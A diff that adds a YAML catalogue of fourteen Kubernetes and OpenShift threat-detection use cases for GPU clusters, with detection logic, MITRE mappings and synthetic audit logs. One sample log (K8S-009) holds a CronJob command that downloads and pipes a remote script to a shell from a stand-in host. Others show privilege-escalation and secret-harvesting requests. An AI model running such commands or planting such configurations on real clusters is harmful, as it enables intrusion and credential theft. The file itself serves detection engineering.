@@ -1,0 +1,221 @@
+category: Container Platform
+code: K8S
+layer: Platform & Pipeline
+scope: Kubernetes, OpenShift, Docker, containerd, admission controllers, service mesh
+usecases:
+
+  - id: K8S-001
+    name: Privileged or host-mounted pod scheduled on GPU nodes
+    severity: High
+    description: >-
+      A pod with privileged mode, hostPID, hostNetwork or a hostPath mount of / effectively owns the node, including
+      every other tenant's GPU memory, model files and tokens on it.
+    log_sources:
+      - Kubernetes API server audit logs
+    detection: >-
+      Pod create or update with securityContext.privileged=true, hostPID, hostNetwork, hostIPC or a hostPath volume,
+      in namespaces other than the approved system list (kube-system, gpu-operator, network-operator).
+    mappings: [T1610, T1611]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Request","auditID":"0b7e5c1a-2f3d-4e8a-9b6c-1d2e3f4a5b6c","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/team-vision/pods","verb":"create","user":{"username":"oidc:jsmith@corp.example","groups":["oidc:researchers","system:authenticated"]},"sourceIPs":["10.20.44.118"],"userAgent":"kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46","objectRef":{"resource":"pods","namespace":"team-vision","name":"debug-gpu","apiVersion":"v1"},"responseStatus":{"code":201},"requestObject":{"kind":"Pod","spec":{"hostPID":true,"nodeSelector":{"nvidia.com/gpu.present":"true"},"containers":[{"name":"dbg","image":"ubuntu:24.04","securityContext":{"privileged":true},"volumeMounts":[{"name":"host","mountPath":"/host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}},"requestReceivedTimestamp":"2026-11-12T13:10:22.104Z","stageTimestamp":"2026-11-12T13:10:22.161Z","annotations":{"authorization.k8s.io/decision":"allow","pod-security.kubernetes.io/enforce-policy":"privileged:latest"}}
+
+  - id: K8S-002
+    name: Interactive exec into production training or inference pods
+    severity: Medium
+    description: >-
+      kubectl exec into pods that hold model weights, API keys and customer prompts bypasses deployment controls.
+      In production it should be rare, ticketed and done by named on-call engineers.
+    log_sources:
+      - Kubernetes API server audit logs
+    detection: >-
+      create on pods/exec or pods/attach in namespaces labeled env=prod or tier=inference/training, by users outside
+      the on-call group or with no incident ticket, especially with tty=true and /bin/sh or bash.
+    mappings: [T1609]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"5d1c9e7a-3b2f-4a6e-8c1d-9f0e2a3b4c5d","stage":"ResponseStarted","requestURI":"/api/v1/namespaces/inference-prod/pods/vllm-llama-70b-0/exec?command=%2Fbin%2Fsh&container=vllm&stdin=true&stdout=true&tty=true","verb":"create","user":{"username":"oidc:l.wong@corp.example","groups":["oidc:ml-platform","system:authenticated"]},"sourceIPs":["10.20.44.207"],"userAgent":"kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46","objectRef":{"resource":"pods","namespace":"inference-prod","name":"vllm-llama-70b-0","apiVersion":"v1","subresource":"exec"},"responseStatus":{"code":101},"requestReceivedTimestamp":"2026-11-12T14:02:51.334Z","stageTimestamp":"2026-11-12T14:02:51.389Z"}
+
+  - id: K8S-003
+    name: Binding to cluster-admin created outside GitOps
+    severity: Critical
+    description: >-
+      Binding a user or service account to cluster-admin hands over every namespace, secret and GPU node in the
+      cluster. When a notebook or workload service account does it, that is privilege escalation in progress.
+    log_sources:
+      - Kubernetes API server audit logs
+    detection: >-
+      create or update of clusterrolebindings or rolebindings whose roleRef is cluster-admin, admin or a wildcard role,
+      by any identity other than the GitOps controller, and especially by system:serviceaccount:* subjects.
+    mappings: [T1098.006]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"9a8b7c6d-5e4f-4a3b-9c2d-1e0f9a8b7c6d","stage":"ResponseComplete","requestURI":"/apis/rbac.authorization.k8s.io/v1/clusterrolebindings","verb":"create","user":{"username":"system:serviceaccount:team-nlp:notebook-sa","groups":["system:serviceaccounts","system:serviceaccounts:team-nlp","system:authenticated"]},"sourceIPs":["10.244.18.37"],"userAgent":"python-requests/2.32.3","objectRef":{"resource":"clusterrolebindings","name":"nb-admin","apiGroup":"rbac.authorization.k8s.io","apiVersion":"v1"},"responseStatus":{"code":201},"requestObject":{"kind":"ClusterRoleBinding","metadata":{"name":"nb-admin"},"roleRef":{"apiGroup":"rbac.authorization.k8s.io","kind":"ClusterRole","name":"cluster-admin"},"subjects":[{"kind":"ServiceAccount","name":"notebook-sa","namespace":"team-nlp"}]},"requestReceivedTimestamp":"2026-11-12T15:20:07.551Z","stageTimestamp":"2026-11-12T15:20:07.590Z"}
+
+  - id: K8S-004
+    name: Anonymous request allowed by the Kubernetes API server
+    severity: Critical
+    description: >-
+      A binding that grants rights to system:anonymous or system:unauthenticated turns an exposed API server into an
+      open door. Scanners look for exactly this on GPU clusters.
+    log_sources:
+      - Kubernetes API server audit logs
+    detection: >-
+      Any request from system:anonymous with a 2xx response on paths other than /healthz, /livez, /readyz and /version,
+      or any RBAC binding whose subject is system:anonymous or system:unauthenticated.
+    mappings: [T1552.007, T1613]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"2c3d4e5f-6a7b-4c8d-9e0f-1a2b3c4d5e6f","stage":"ResponseComplete","requestURI":"/api/v1/secrets?limit=500","verb":"list","user":{"username":"system:anonymous","groups":["system:unauthenticated"]},"sourceIPs":["203.0.113.120"],"userAgent":"curl/8.5.0","objectRef":{"resource":"secrets","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"2026-11-12T16:44:13.002Z","stageTimestamp":"2026-11-12T16:44:13.019Z","annotations":{"authorization.k8s.io/decision":"allow","authorization.k8s.io/reason":"RBAC: allowed by ClusterRoleBinding \"anon-debug\" of ClusterRole \"cluster-admin\" to User \"system:anonymous\""}}
+
+  - id: K8S-005
+    name: Service account token used from outside the cluster
+    severity: High
+    description: >-
+      Service account tokens stolen from a training pod (through a notebook, a log or an SSRF) can be replayed from a
+      laptop or the internet. Bound tokens record the node and pod they were issued to, which makes off-cluster use
+      easy to spot.
+    log_sources:
+      - Kubernetes API server audit logs
+    detection: >-
+      Requests from system:serviceaccount:* identities whose sourceIPs are outside the pod and node CIDRs, the same
+      token credential-id seen from more than one source, or service accounts calling with kubectl user agents from
+      non-Linux platforms.
+    mappings: [T1528, T1550.001]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"7e6d5c4b-3a2f-4e1d-8c9b-0a1f2e3d4c5b","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/ml-train/pods","verb":"list","user":{"username":"system:serviceaccount:ml-train:trainer","uid":"3f9e1c2d-4b5a-4e6f-8d7c-9b0a1f2e3d4c","groups":["system:serviceaccounts","system:serviceaccounts:ml-train","system:authenticated"],"extra":{"authentication.kubernetes.io/credential-id":["JTI=4f1e2d3c-5b6a-4978-8e7f-6a5b4c3d2e1f"],"authentication.kubernetes.io/node-name":["dgx-h100-r04-n11"],"authentication.kubernetes.io/pod-name":["trainer-0"]}},"sourceIPs":["198.51.100.250"],"userAgent":"kubectl/v1.30.4 (darwin/arm64) kubernetes/a51b3b7","objectRef":{"resource":"pods","namespace":"ml-train","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"2026-11-12T17:02:44.771Z","stageTimestamp":"2026-11-12T17:02:44.790Z"}
+
+  - id: K8S-006
+    name: Secrets read across namespaces by a single identity
+    severity: High
+    description: >-
+      Kubernetes secrets hold registry credentials, S3 keys for datasets and checkpoints, NGC and Hugging Face tokens,
+      and database passwords. One identity reading secrets in several namespaces is harvesting credentials.
+    log_sources:
+      - Kubernetes API server audit logs
+    detection: >-
+      get, list or watch on secrets in 3 or more namespaces within 10 minutes by one identity, any cluster-wide list
+      of secrets by a non-controller identity, or a successful secret read after a burst of 403s.
+    mappings: [T1552.007]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5e","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/mlflow/secrets/mlflow-s3-credentials","verb":"get","user":{"username":"system:serviceaccount:team-nlp:notebook-sa","groups":["system:serviceaccounts","system:serviceaccounts:team-nlp","system:authenticated"]},"sourceIPs":["10.244.18.37"],"userAgent":"python-requests/2.32.3","objectRef":{"resource":"secrets","namespace":"mlflow","name":"mlflow-s3-credentials","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"2026-11-12T15:21:30.118Z","stageTimestamp":"2026-11-12T15:21:30.126Z"}
+
+  - id: K8S-007
+    name: Admission controller webhook deleted or set to fail open
+    severity: High
+    description: >-
+      Kyverno, Gatekeeper and image-signature webhooks are what keep privileged pods and unsigned images out of GPU
+      clusters. Deleting them, or flipping failurePolicy to Ignore, switches those guardrails off.
+    log_sources:
+      - Kubernetes API server audit logs
+    detection: >-
+      delete, update or patch on validatingwebhookconfigurations or mutatingwebhookconfigurations of policy engines,
+      failurePolicy changed to Ignore, or policies changed from Enforce to Audit, outside GitOps.
+    mappings: [T1562.001]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"4b5c6d7e-8f9a-4b0c-9d1e-2f3a4b5c6d7e","stage":"ResponseComplete","requestURI":"/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations/kyverno-resource-validating-webhook-cfg","verb":"delete","user":{"username":"oidc:d.ivanov@corp.example","groups":["oidc:platform-eng","system:authenticated"]},"sourceIPs":["10.20.44.207"],"userAgent":"kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46","objectRef":{"resource":"validatingwebhookconfigurations","name":"kyverno-resource-validating-webhook-cfg","apiGroup":"admissionregistration.k8s.io","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"2026-11-12T18:05:40.220Z","stageTimestamp":"2026-11-12T18:05:40.247Z"}
+
+  - id: K8S-008
+    name: Unsigned or untrusted-registry image admitted to the cluster
+    severity: High
+    description: >-
+      Training and inference images pull in CUDA, NCCL, Python wheels and model code. An image from an unapproved
+      registry, or one that fails signature verification, is a supply-chain entry point onto GPU nodes.
+    log_sources:
+      - Kyverno / Gatekeeper policy reports and events
+      - Kubernetes API server audit logs
+    detection: >-
+      Image signature verification failures (cosign / Notation), images from registries outside the allow-list,
+      mutable tags (:latest) in production namespaces, or a policy in Audit mode letting such a pod run.
+    mappings: [T1204.003, T1525]
+    sample_log: |
+      {"kind":"Event","apiVersion":"v1","metadata":{"name":"finetune-7d9f-xk2pq.1879a1b2c3d4e5f6","namespace":"team-vision"},"involvedObject":{"kind":"Pod","namespace":"team-vision","name":"finetune-7d9f-xk2pq"},"reason":"PolicyViolation","message":"policy verify-image-signatures/check-cosign-signature fail: failed to verify image registry.example.net/public/finetune:latest: .attestors[0].entries[0].keys: no matching signatures","source":{"component":"kyverno-admission"},"type":"Warning","firstTimestamp":"2026-11-12T18:30:12Z","lastTimestamp":"2026-11-12T18:30:12Z","count":1}
+
+  - id: K8S-009
+    name: CronJob created for persistence in a system namespace
+    severity: High
+    description: >-
+      A CronJob that re-downloads a payload on a schedule survives pod restarts and node reimaging. In kube-system or
+      on hostNetwork it hides among legitimate jobs.
+    log_sources:
+      - Kubernetes API server audit logs
+    detection: >-
+      create or update of cronjobs in kube-system or other system namespaces by non-GitOps identities, or CronJobs
+      whose command contains curl, wget, base64 or "| sh", or that use hostNetwork or privileged containers.
+    mappings: [T1053.007]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"6f7a8b9c-0d1e-4f2a-8b3c-4d5e6f7a8b9c","stage":"ResponseComplete","requestURI":"/apis/batch/v1/namespaces/kube-system/cronjobs","verb":"create","user":{"username":"system:serviceaccount:team-nlp:notebook-sa","groups":["system:serviceaccounts","system:authenticated"]},"sourceIPs":["10.244.18.37"],"userAgent":"python-requests/2.32.3","objectRef":{"resource":"cronjobs","namespace":"kube-system","name":"node-health-sync","apiGroup":"batch","apiVersion":"v1"},"responseStatus":{"code":201},"requestObject":{"kind":"CronJob","spec":{"schedule":"*/10 * * * *","jobTemplate":{"spec":{"template":{"spec":{"hostNetwork":true,"containers":[{"name":"sync","image":"alpine:3.20","command":["/bin/sh","-c","wget -qO- http://203.0.113.50/n.sh | sh"]}],"restartPolicy":"OnFailure"}}}}}},"requestReceivedTimestamp":"2026-11-12T15:24:51.006Z","stageTimestamp":"2026-11-12T15:24:51.041Z"}
+
+  - id: K8S-010
+    name: Service mesh mTLS downgraded to permissive or disabled
+    severity: Medium
+    description: >-
+      Mesh mTLS encrypts and authenticates traffic between gateways, model servers and vector databases. Setting
+      PeerAuthentication to PERMISSIVE or DISABLE allows plaintext sniffing and spoofed workloads.
+    log_sources:
+      - Kubernetes API server audit logs (Istio / Linkerd CRDs)
+    detection: >-
+      create, update or patch of peerauthentications.security.istio.io whose mtls.mode is PERMISSIVE or DISABLE,
+      especially the mesh-wide default in istio-system, outside GitOps.
+    mappings: [T1562.001, T1040]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"8c9d0e1f-2a3b-4c4d-9e5f-6a7b8c9d0e1f","stage":"ResponseComplete","requestURI":"/apis/security.istio.io/v1/namespaces/istio-system/peerauthentications/default","verb":"patch","user":{"username":"oidc:k.osei@corp.example","groups":["oidc:netops","system:authenticated"]},"sourceIPs":["10.20.31.144"],"userAgent":"kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46","objectRef":{"resource":"peerauthentications","namespace":"istio-system","name":"default","apiGroup":"security.istio.io","apiVersion":"v1"},"responseStatus":{"code":200},"requestObject":{"spec":{"mtls":{"mode":"PERMISSIVE"}}},"requestReceivedTimestamp":"2026-11-12T19:12:03.311Z","stageTimestamp":"2026-11-12T19:12:03.342Z"}
+
+  - id: K8S-011
+    name: Container runtime socket mounted into a pod
+    severity: High
+    description: >-
+      Mounting containerd.sock, docker.sock or crio.sock lets a pod start privileged containers on the node, read any
+      container's filesystem and bypass Kubernetes admission.
+    log_sources:
+      - Kubernetes API server audit logs
+      - Falco / runtime security events
+    detection: >-
+      Pod specs with hostPath volumes for /run/containerd/containerd.sock, /var/run/docker.sock or
+      /var/run/crio/crio.sock outside approved system namespaces, or processes in containers connecting to those
+      sockets.
+    mappings: [T1611, T1609]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Request","auditID":"0c1d2e3f-4a5b-4c6d-8e7f-9a0b1c2d3e4f","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/team-vision/pods","verb":"create","user":{"username":"oidc:jsmith@corp.example","groups":["oidc:researchers","system:authenticated"]},"sourceIPs":["10.20.44.118"],"userAgent":"kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46","objectRef":{"resource":"pods","namespace":"team-vision","name":"build-helper","apiVersion":"v1"},"responseStatus":{"code":201},"requestObject":{"kind":"Pod","spec":{"containers":[{"name":"helper","image":"registry.corp.example/tools/ctr:1.7","volumeMounts":[{"name":"ctrsock","mountPath":"/run/containerd/containerd.sock"}]}],"volumes":[{"name":"ctrsock","hostPath":{"path":"/run/containerd/containerd.sock","type":"Socket"}}]}},"requestReceivedTimestamp":"2026-11-12T19:30:02.441Z","stageTimestamp":"2026-11-12T19:30:02.480Z"}
+
+  - id: K8S-012
+    name: Pods connecting directly to the kubelet API
+    severity: High
+    description: >-
+      The kubelet API on port 10250 can list pods and run commands in any container on the node. Workloads have no
+      reason to call it, so a connection from a pod is reconnaissance or an exec attempt that bypasses API-server audit.
+    log_sources:
+      - Cilium Hubble / CNI flow logs
+      - Zeek conn.log
+    detection: >-
+      Flows from pod CIDRs to TCP 10250 or 10255 on any node, or kubelet authentication failures from sources other
+      than the API server and monitoring agents.
+    mappings: [T1609, T1613]
+    sample_log: |
+      {"flow":{"time":"2026-11-12T19:40:22.118Z","verdict":"FORWARDED","IP":{"source":"10.244.18.37","destination":"10.50.7.88","ipVersion":"IPv4"},"l4":{"TCP":{"source_port":40212,"destination_port":10250,"flags":{"SYN":true}}},"source":{"identity":48211,"namespace":"team-nlp","labels":["k8s:app=jupyter","k8s:io.kubernetes.pod.namespace=team-nlp"],"pod_name":"notebook-jsmith-0"},"destination":{"identity":1,"labels":["reserved:host"]},"Type":"L3_L4","node_name":"dgx-h100-r04-n11","traffic_direction":"EGRESS","is_reply":false,"Summary":"TCP Flags: SYN"}}
+
+  - id: K8S-013
+    name: Privileged SCC granted to a workload service account (OpenShift)
+    severity: High
+    description: >-
+      On OpenShift, adding the privileged or anyuid SecurityContextConstraint to a service account lifts the
+      platform's default container isolation for every pod that uses it.
+    log_sources:
+      - OpenShift API server audit logs
+    detection: >-
+      RoleBinding or ClusterRoleBinding creation that references system:openshift:scc:privileged, hostaccess,
+      hostmount-anyuid or anyuid for service accounts in tenant namespaces, outside GitOps.
+    mappings: [T1098.006]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"3e4f5a6b-7c8d-4e9f-8a0b-1c2d3e4f5a6b","stage":"ResponseComplete","requestURI":"/apis/rbac.authorization.k8s.io/v1/namespaces/team-vision/rolebindings","verb":"create","user":{"username":"jsmith","groups":["research","system:authenticated:oauth","system:authenticated"]},"sourceIPs":["10.20.44.118"],"userAgent":"oc/4.17.0 (linux/amd64) kubernetes/0ce4d0a","objectRef":{"resource":"rolebindings","namespace":"team-vision","name":"system:openshift:scc:privileged","apiGroup":"rbac.authorization.k8s.io","apiVersion":"v1"},"responseStatus":{"code":201},"requestObject":{"kind":"RoleBinding","roleRef":{"apiGroup":"rbac.authorization.k8s.io","kind":"ClusterRole","name":"system:openshift:scc:privileged"},"subjects":[{"kind":"ServiceAccount","name":"finetune-sa","namespace":"team-vision"}]},"requestReceivedTimestamp":"2026-11-12T20:01:12.414Z","stageTimestamp":"2026-11-12T20:01:12.449Z"}
+
+  - id: K8S-014
+    name: Production namespace deleted by an automation identity from an odd source
+    severity: High
+    description: >-
+      Deleting an inference or training namespace takes down serving, removes PVC claims and can trigger volume
+      deletion. When a GitOps or CI identity does it from a laptop or an external IP, the credentials are compromised.
+    log_sources:
+      - Kubernetes API server audit logs
+    detection: >-
+      delete on namespaces labeled env=prod, or deletes of 20 or more pods, deployments or PVCs in 5 minutes, by an
+      identity whose source IP or user agent differs from its 30-day baseline.
+    mappings: [T1485, T1489]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"5a6b7c8d-9e0f-4a1b-8c2d-3e4f5a6b7c8d","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/inference-prod","verb":"delete","user":{"username":"oidc:svc-gitops-bot@corp.example","groups":["oidc:automation","system:authenticated"]},"sourceIPs":["198.51.100.250"],"userAgent":"kubectl/v1.30.4 (darwin/arm64) kubernetes/a51b3b7","objectRef":{"resource":"namespaces","name":"inference-prod","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"2026-11-12T23:41:09.552Z","stageTimestamp":"2026-11-12T23:41:09.601Z"}
